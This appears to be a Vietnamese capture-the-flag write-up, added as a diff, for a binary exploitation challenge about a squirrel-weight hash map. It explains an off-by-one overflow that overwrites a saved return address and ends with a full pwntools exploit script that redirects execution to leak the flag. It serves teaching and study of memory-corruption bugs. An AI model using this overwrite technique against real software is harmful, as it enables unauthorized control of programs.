@@ -632,3 +632,154 @@ int main() {
 ```
 
 </details>
+
+## Ý tưởng
+
+- Bài này em tham khảo wu ạ
+
+```c
+void increment(map *m, char *key, size_t amount) {
+    size_t hash = hash_string(key);
+    if (hash == 0)
+        return;
+
+    size_t index = hash % BIN_COUNT;
+
+    for (size_t i = 0; i <= BIN_COUNT; i++) {
+        map_entry *entry = &m->data->bins[index][i];
+
+        // Increment existing
+        if (strncmp(entry->name, key, MAX_NAME_LEN) == 0) {
+            entry->weight += amount;
+            printf("Squirrel %s has weight %zu lbs\n", entry->name, entry->weight);
+            return;
+        }
+
+        // Create new
+        if (i == m->data->bin_sizes[index]) {
+            strncpy(entry->name, key, MAX_NAME_LEN);
+            entry->weight += amount;
+            if (key != FLAG_SQUIRREL_NAME) printf("New squirrel %s has weight %zu lbs\n", entry->name, entry->weight);
+            m->data->bin_sizes[index]++;
+            // TODO: enforce that new weight does not exceed the "presidential chonk!"
+            get_max_weight(&flag_map, FLAG_SQUIRREL_NAME);
+            return;
+        }
+    }
+}
+```
+
+- Bài này quá lú lun ạ, đề cho ta một struct map_data chứa một biến bin_sizes kiểu size_t và một mảng 10 bins, mỗi bin có đủ không gian cho 4 mục trong bản đồ. Một mục trong bản đồ chứa 16 byte cho tên và một trọng lượng.
+- `increment(&flag_map, "santa", flag_weight);.`, là mục tiêu của chúng ta tạo một mục cho con sóc santa với cờ của chúng tôi là trọng lượng trong bản đồ flag.
+- Mỗi lần chúng ta muốn cho con sóc ăn, nó sẽ tăng một biến i lên 1, và khi biến đếm đạt đến 5, vòng lặp while sẽ dừng lại và chương trình sẽ thoát.
+- Khi cho con sóc ăn, hàm increment trước tiên gọi hàm hash_string với name_input của chúng ta. Hàm này đơn giản là lấy mỗi ký tự của đầu vào của chúng ta, nhân nó với 31 và cộng với một tổng số. Nó trả về tổng số này được sử dụng để tạo chỉ mục sau khi lấy phần dư của tổng số băm (hash sum) cho 10 (BIN_COUNT). Biến chỉ mục này sẽ được sử dụng để quyết định con sóc của chúng ta thuộc vào thùng nào
+- Mỗi thùng có đủ không gian cho 4 mục bản đồ, nhưng vòng lặp while trong hàm loop cho phép chúng ta thêm 5. Hơn nữa, hàm increment không kiểm tra xem thùng đã đầy chưa.
+- Nói tóm lại,bins được khởi tạo 10 bins (chỉ số max là 9), và 4 mục (chỉ số max là 3) nhưng ta có thể truy cập đến phần tử thứ 10 `for (size_t i = 0; i <= 10; i++)` và mục thứ 4 `while (i < 5)`
+
+```c
+typedef struct map_data {
+    size_t bin_sizes[10];
+    map_entry bins[10][4];
+} map_data;
+```
+
+## Khai thác
+
+> do bài này em lú quá lú nên em sẽ nhìn script và giải thích ra hướng khai thác
+
+- Thì từ lỗ hổng ta được cho ăn 5 lần ta sẽ nhập vào 5 lần như sau
+
+```python
+count = 0
+for i in range(0x100):
+    if (i*31) % 10 == 9:
+        if count == 4:
+            break
+```
+
+- Ở chỗ này ta sẽ giả lập lại cách để có được `index = 9`
+
+```python
+    if (i*31) % 10 == 9:
+        if count == 4:
+```
+
+- Khi mà chạy xong 4 lần ta chú ý ở chỗ này, kiểm tra stack
+
+![image](https://user-images.githubusercontent.com/111769169/230154649-89a9d732-6d6f-4080-b89b-91501f8692db.png)
+
+- Mũi tên đỏ chính là rip của hàm loop
+- Những gạch chân màu đó chính là tên và khối lượng chúng ta cho sóc ăn
+- Và gạch màu vàng chính là lần thứ 5 ta cho ăn, khối lượng của chúng ta cho ăn có thể ghi đè được địa chỉ rip của loop, khi đó thay vì trở về main để kết thúc, nó sẽ nhảy về một hàm nào đó. (lúc em thử thì khối lượng em cho tạm là 12345)
+  > đoạn này phải check stack hơi sâu ở dưới
+- Kết quả sau khi ghi đè
+
+![image](https://user-images.githubusercontent.com/111769169/230157188-6decb596-ddaf-4400-8bc3-804299be1ba9.png)
+
+- Và mỗi khi cho ăn lúc kết thúc lần cho ăn đó, nó sẽ gọi một hàm `void get_max_weight(map *m, char *key)`
+- Nó set thanh rsi là `santa`
+- Trong khi đó, em thử vào option 2, nhập tên thì rsi sẽ là tên mình gửi vào và in ra cân nặng
+
+![image](https://user-images.githubusercontent.com/111769169/230161795-94f36881-d83c-4a48-a976-3361d4de4df3.png)
+
+- Đây là lúc ta nhảy qua `get_max_weight`
+
+![image](https://user-images.githubusercontent.com/111769169/230162621-c3396296-8a3e-4cc1-8892-2af3b7957eaf.png)
+
+- vậy nếu ta nhảy vảo `print` thì nó lấy địa chỉ của flag_map và tên santa
+
+## Kết quả
+
+### full script
+
+```python
+#!/usr/bin/python3
+# script của a Trí =))
+
+from pwn import *
+exe = ELF('challenge', checksec=False)
+
+p = process(exe.path)
+
+
+def info(msg): return log.info(msg)
+def sla(msg, data): return p.sendlineafter(msg, data)
+def sa(msg, data): return p.sendafter(msg, data)
+def sl(data): return p.sendline(data)
+def s(data): return p.send(data)
+
+
+p.pie = False
+
+gdb.attach(p, gdbscript='''
+b*increment+31
+b*increment+192
+b*increment+446
+c
+''')
+input()
+# Idea: Increment() has maximum index is 9 and i is 10
+# But structure map_data is just 9 and 3
+# typedef struct map_data {
+#     size_t bin_sizes[10];
+#     map_entry bins[10][4];
+# } map_data;
+# --> Overflow
+
+count = 0
+for i in range(0x100):
+    if (i*31) % 10 == 9:
+        if count == 4:
+            break
+        sla(b'> ', b'1')
+        sla(b'name: ', p8(i) + b'\0')
+        sla(b'them: ', str(i).encode())
+        count += 1
+
+# After executing increment, rdi and rsi is set so just call print()
+# to get the leak
+sla(b'> ', b'1')
+sla(b'name: ', p8(49) + b'\0')
+sla(b'them: ', str(-0x4ad).encode())
+p.interactive()
+```
